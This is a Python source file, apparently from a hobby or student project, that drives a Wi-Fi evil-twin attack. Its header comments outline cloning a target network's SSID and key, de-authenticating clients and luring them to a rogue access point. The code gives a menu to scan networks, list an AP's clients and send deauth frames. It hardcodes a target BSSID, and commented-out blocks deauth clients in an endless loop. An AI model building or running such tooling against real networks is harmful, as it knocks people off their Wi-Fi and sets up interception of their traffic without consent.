# Get SSIDS in wifi medium (scan network)

# Choose one SSID to emulate - e.g. based on WPA2, name, number of clients connected to it

# Can we crack the key in order to create our own AP? if not go to next..

# Create rogue AP with same SSID+key

# Send beacon frames where we look like good AP (but we are the bad AP)

# De-auth clients connected to SSID

# Let clients connect to our rogue AP

from scanner import Scanner
from deauth import deauth
from get_clients_on_ap import get_clients_on_ap

INTERFACE = "wlan0"
TIMEOUT = 20

Lukas_WEP_AP = "48:f8:b3:e4:03:04"


# Create terminal menu for user to choose what to do
def prompt_menu():
    print("1. Scan network")
    print("2. Show clients")
    print("3. Send deauth")
    print("4. Exit")
    action = input("Input action wanted: ").strip()
    return action


def scan_network() -> bool:
    # prompt user for AP to attack
    AP_TO_ATTACK = input("Input AP to attack ('Enter' to skip): ").strip()
    if AP_TO_ATTACK:
        with Scanner(INTERFACE) as scanner:
            AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
            channel = AP_info.Channel[0]
            BSSID = AP_info.index[0]
            # change channel to be on APs channelwifi: Wifi
            scanner.set_channel(channel)
        print(AP_info)
        print(scanner.wifis)
        print(f"Channel is: {channel}")
        print(f"BSSID is: {BSSID}")
    else:
        with Scanner(INTERFACE) as scanner:
            AP_info = scanner.get_ap(timeout=TIMEOUT)
        print(AP_info)
        print(scanner.wifis)
    input("Press enter to continue...")
    return True


def show_clients():
    target_ap = input("Input AP BSSID for client scan: ")
    print(f"Extracting client list for AP: {target_ap}")
    client_list = get_clients_on_ap(TIMEOUT, INTERFACE, target_ap)
    print(client_list)
    input("Press enter to continue...")


def send_deauth():
    target_ap = input("Input AP BSSID for deauth: ")
    target_client = input("Input client MAC for deauth: ")
    deauth(target_ap, target_client, INTERFACE)
    input("Press enter to continue...")


action = prompt_menu()
while True:
    if action == "1":
        scan_network()
    elif action == "2":
        show_clients()
    elif action == "3":
        send_deauth()
    elif action == "4":
        break
    else:
        print("Invalid input. Try again..")
    action = prompt_menu()


"""
with Scanner(INTERFACE) as scanner:

    action = input("Input action wanted:\n1. Scan network.\n2. Show clients\n3. Send deauth\n4. exit\n")

    if action == "1":
        # AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
        AP_info = scanner.get_ap(timeout=TIMEOUT)
        print(AP_info)
        print(scanner.wifis)
        channel = AP_info.Channel[0]
        BSSID = AP_info.index[0]

        # change channel to be on APs channelwifi: Wifi
        scanner.set_channel(channel)
        print(f"Channel is: {scanner.curr_channel}")

    elif action == "2":
        target_ap = input("Input AP BSSID for client scan: ")
        print(f"Extracting client list for AP: {target_ap}")
        client_list = get_clients_on_ap(TIMEOUT, INTERFACE, target_ap)
        print(client_list)

    elif action == "3":

        def check_deauth(pkt):
            print("Recived package")
            elt = pkt[Dot11Elt]
            while elt and elt.ID != 0:
                elt = elt.payload[Dot11Elt]
            print(elt.info)
            # if pkt[Dot11].addr1 == BSSID:
            deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)

        sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt", count=20)  # subtype assoc-req")  # start sniffin
    elif action == "4":
        exit()
"""

# channel = AP_info.Channel[0]
# BSSID = AP_info.index[0]
# print(AP_info.Channel)
# print(BSSID[0])
# os.system(f"iwconfig {INTERFACE} channel {channel}")
# # clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)

# # Deauth clients
# while True:
#     print("Deauthenticating clients...")
#     reason_code = random.randint(1, 68)
#     deauth_clients(iface=INTERFACE, clients=clients, AP_mac=BSSID, reasoncode=reason_code)
